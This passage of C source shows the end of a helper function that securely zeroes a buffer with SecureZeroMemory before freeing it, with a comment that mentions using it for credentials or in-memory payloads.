        Customish wrapper for free calls, will call WhisperSecureZeroMemory, to zero out memory,
        then free it

        NOTE: DOES need size, no sizeof(wahtever) will not work, that's the pointer size.

        Use for thing like creds, or payloads in memory, etc

    */
    DEBUG_LOG("[FUNC_CALL] SecureFree\n");

    if (!ptr || size == 0)
        return; // Prevent access violations

    // Securely wipe memory before freeing
    SecureZeroMemory(ptr, size);

    // Free the memory
    free(ptr);
}
